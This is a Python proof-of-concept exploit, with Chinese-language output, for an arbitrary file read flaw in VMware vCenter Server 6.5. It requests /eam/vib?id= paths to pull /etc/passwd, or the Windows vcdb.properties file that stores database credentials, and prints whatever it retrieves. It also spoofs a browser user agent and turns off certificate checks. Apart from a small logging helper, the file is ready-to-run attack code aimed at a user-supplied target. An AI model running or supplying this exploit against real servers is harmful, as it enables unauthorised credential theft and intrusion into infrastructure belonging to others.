import requests
import sys
import random
import re
from fake_useragent import UserAgent
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class IOFlow(str):

    def __init__(self) -> None:
        super().__init__()
        self._cout = sys.stdout

    def _write(self, s:str):
        self.cout.write(s)

    def __lshift__(self, s: str)->int:
        return self._cout.write(s)

endl = "\n"
cout = IOFlow()

class Color:
    START       = "\033["
    END         = START+"0m"
    
    C_RED         = START+"31m"
    C_GREEN       = START+"32m"
    C_YELLOW      = START+"33m"
    C_BLUE        = START+"34m"

    # RANDOM_COLOR    = random.choice()

class Color(Color):
    ALL_COLOR       =   {k:v for k, v in Color.__dict__.items() if "C_" in k}
    _COLOR_S        = lambda color, s: color+s+Color.END

class Color(Color):

    RED_S           = lambda s: Color._COLOR_S(Color.C_RED, s)
    GREEN_S         = lambda s: Color._COLOR_S(Color.C_GREEN, s)
    YELLOW_S        = lambda s: Color._COLOR_S(Color.C_YELLOW, s)
    BLUE_S          = lambda s: Color._COLOR_S(Color.C_BLUE, s)

class Log:
    BASE_SYM        = lambda sym: f"{sym}"
    TEMPLATE        = lambda sym, msg: cout << f"{sym} : {msg}\n"

class Log(Log):
    INFO_SYM            = Log.BASE_SYM(Color.BLUE_S("[*]"))
    WARING_SYM          = Log.BASE_SYM(Color.YELLOW_S("[!]"))
    SUCCESS_SYM         = Log.BASE_SYM(Color.GREEN_S("[+]"))

class Log(Log):
    info                = lambda msg: Log.TEMPLATE(Log.INFO_SYM, Color.BLUE_S(msg))
    waring              = lambda msg: Log.TEMPLATE(Log.WARING_SYM,Color.YELLOW_S(msg))
    success             = lambda msg: Log.TEMPLATE(Log.SUCCESS_SYM,Color.GREEN_S(msg))

def info():
    Log.info(f'+------------------------------------------') 
    Log.info(f'Version: VMware vCenter任意文件读取漏洞 ')
    Log.info(f'Version: VMware vCenter Server 6.5.0a- f 版本')
    Log.info(f'usage:  python3 poc.py URL ')
    Log.info(f'example:  python3 poc.py http://127.0.0.1')
    Log.info(f'+------------------------------------------')

def POC(target_url):
    vuln_url_windows = target_url + "/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\cfg\\vmware-vpx\\vcdb.properties"
    vuln_url_linux = target_url + "/eam/vib?id=/etc/passwd"
    headers = {
        "User-Agent": UserAgent().chrome,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response_linux = requests.get(url=vuln_url_linux, headers=headers, verify=False, timeout=5)
        response_windows = requests.get(url=vuln_url_windows, headers=headers, verify=False, timeout=5)
        print(response_linux,vuln_url_linux)
        if "password" in response_windows.text and response_windows.status_code == 200:
            Log.success("目标 {}存在漏洞 ,成功读取 vcdb.properties".format(target_url))
            Log.success("Windows系统, 响应为:\n{}".format(response_windows.text))
        elif "root" in response_linux.text and response_linux.status_code == 200:
            Log.success("目标 {}存在漏洞 ,成功读取 /etc/passwd".format(target_url))
            Log.success("Linux系统, 响应为:\n{} ".format(response_linux.text))
        else:
            Log.waring("不存在漏洞 ")
            sys.exit(0)
    except Exception as e:
        Log.waring(" 请求失败 ", e)


if __name__ == '__main__':
    try:
        POC(sys.argv[1])
    except:
        info()
